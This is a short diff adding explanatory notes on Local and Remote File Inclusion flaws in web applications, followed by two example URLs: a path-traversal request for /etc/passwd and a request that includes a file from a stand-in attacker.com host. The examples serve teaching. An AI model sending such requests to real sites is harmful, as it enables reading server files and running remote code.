@@ -1,1 +1,9 @@
+LFI (Local File Inclusion) is a type of vulnerability in web applications 
+where an attacker can include files that are stored locally on the server. 
 
+RFI (Remote File Inclusion) is a vulnerability in web applications where an 
+attacker can include a file from a remote server instead of from the local server. 
+It’s similar to LFI, but in this case, the file being included is hosted on an external system.
+
+http://example.com/view-file.php?file=../../../../etc/passwd
+http://example.com/load-image.php?image=http://attacker.com/maliciousfile.txt
